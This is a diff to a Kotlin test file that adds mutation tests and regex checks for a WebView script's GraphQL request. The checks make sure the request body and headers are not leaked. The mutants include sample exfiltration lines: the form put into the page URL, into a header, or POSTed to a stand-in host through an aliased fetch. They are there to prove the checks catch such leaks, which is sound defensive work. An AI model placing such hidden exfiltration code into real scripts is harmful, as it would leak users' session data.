@@ -2023,6 +2023,19 @@ class WebViewTransportTest {
             "an extra GraphQL header" to real.replace("'x-csrftoken': cookie('csrftoken') };", "'x-csrftoken': cookie('csrftoken'), 'x-ig-www-claim': claim() };"),
             "no friendly-name header" to real.replace("'x-fb-friendly-name': name, ", ""),
             "another app id on the GraphQL POST" to inGraphQl(real) { it.replace(WebHeaders.APP_ID, "936619743392459") },
+            // T-F1, the tests lens's survivors: where the built form and headers may go.
+            "T-F1 J01: the form in the page's own URL" to inGraphQl(real) {
+                it.replace("    var controller = new AbortController();", "    history.replaceState(null,'','/?' + body);\n    var controller = new AbortController();")
+            },
+            "T-F1 J02: the form to another site through an aliased fetch" to inGraphQl(real) {
+                it.replace(
+                    "    var controller = new AbortController();",
+                    "    var f = window.fetch; f('https://example.invalid/', {method:'POST', body: body});\n    var controller = new AbortController();",
+                )
+            },
+            "T-F1 J03: the form in a header" to inGraphQl(real) {
+                it.replace("    var controller = new AbortController();", "    headers['x-ig-www-claim'] = String(body);\n    var controller = new AbortController();")
+            },
         )
         for ((what, mutant) in mutants) {
             assertTrue(mutant != real, "the mutant '$what' did not change the script")
@@ -2158,6 +2171,13 @@ class WebViewTransportTest {
         // One same-origin GET to the path and one same-origin POST to the GraphQL path, no redirect followed: each option once,
         // and no other.
         assertEquals(2, Regex("""\bfetch\(""").findAll(script).count(), "two fetches: the GET and the GraphQL POST")
+        // T-F1: `fetch` is named twice in the code, as those two calls: never kept under another name (an aliased fetch).
+        assertEquals(2, Regex("""\bfetch\b""").findAll(code).count(), "fetch is named only by the two calls")
+        // T-F1: in the GraphQL call the built form and headers each go exactly one place: made once, used once, by the fetch.
+        val graphQlCode = withoutComments(graphQl)
+        assertEquals(2, Regex("""\bbody\b(?!\s*:)""").findAll(graphQlCode).count(), "the form is made and handed to the fetch, nothing else")
+        assertEquals(2, Regex("""\bheaders\b(?!\s*:)""").findAll(graphQlCode).count(), "the headers are made and handed to the fetch, nothing else")
+        assertTrue(Regex("""\bheaders:\s*headers\b""").containsMatchIn(graphQlCode) && Regex("""\bbody:\s*body\b""").containsMatchIn(graphQlCode), "both in the fetch")
         assertEquals(
             listOf("method" to "'GET'", "credentials" to "'same-origin'", "redirect" to "'manual'", "headers" to "headers", "signal" to "controller.signal")
                 .sortedBy { it.first },
